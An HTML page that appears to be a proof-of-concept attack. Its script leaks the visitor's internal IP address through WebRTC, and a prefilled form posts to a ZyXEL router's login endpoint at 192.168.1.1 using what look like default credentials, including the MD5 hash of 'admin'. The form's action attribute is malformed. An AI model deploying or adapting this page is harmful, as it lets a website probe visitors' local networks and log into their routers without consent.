<html>
	<head>
		<meta charset="utf-8">
		<title>Internal IP Address</title>
		<style type="text/css"></style>
	</head>

	<body>
		Your network IP is: 
		<h1 id="list"></h1>
		<script>
		

// NOTE: window.RTCPeerConnection is "not a constructor" in FF22/23
var RTCPeerConnection = /*window.RTCPeerConnection ||*/ window.webkitRTCPeerConnection || window.mozRTCPeerConnection;

if (RTCPeerConnection) (function () {
    var rtc = new RTCPeerConnection({iceServers:[]});
    if (window.mozRTCPeerConnection) {      // FF needs a channel/stream to proceed
        rtc.createDataChannel('', {reliable:false});
    };
    
    rtc.onicecandidate = function (evt) {
        if (evt.candidate) grepSDP(evt.candidate.candidate);
    };
    rtc.createOffer(function (offerDesc) {
        grepSDP(offerDesc.sdp);
        rtc.setLocalDescription(offerDesc);
    }, function (e) { console.warn("offer failed", e); });
    
    
    var addrs = Object.create(null);
    addrs["0.0.0.0"] = false;
    function updateDisplay(newAddr) {
        if (newAddr in addrs) return;
        else addrs[newAddr] = true;
        var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
        document.getElementById('list').textContent = displayAddrs;
    }
    
    function grepSDP(sdp) {
        var hosts = [];
        sdp.split('\r\n').forEach(function (line) { // c.f. http://tools.ietf.org/html/rfc4566#page-39
            if (~line.indexOf("a=candidate")) {     // http://tools.ietf.org/html/rfc4566#section-5.13
                var parts = line.split(' '),        // http://tools.ietf.org/html/rfc5245#section-15.1
                    addr = parts[4],
                    type = parts[7];
                if (type === 'host') updateDisplay(addr);
            } else if (~line.indexOf("c=")) {       // http://tools.ietf.org/html/rfc4566#section-5.7
                var parts = line.split(' '),
                    addr = parts[2];
                updateDisplay(addr);
            }
        });
    }
})(); else {
    document.getElementById('list').innerHTML = "<code>ifconfig | grep inet | grep -v inet6 | cut -d\" \" -f2 | tail -n1</code>";
    document.getElementById('list').nextSibling.textContent = "In Chrome and Firefox your IP should display automatically, by the power of WebRTCskull.";
}

</script>
		<form method="post" action"http://192.168.1.1/Forms/rpAuth_1">
			LoginPassword: <input type="text" value="ZyXEL+ZyWALL+Series" name="LoginPassword">
			hiddenPassword: <input type="text" value="21232f297a57a5a743894a0e4a801fc3" name="hiddenPassword">
			Prestige_Login: <input type="text" value="Login" name="Prestige_Login">
			<input type="submit" value="submit">
		</form>
	</body>

</html>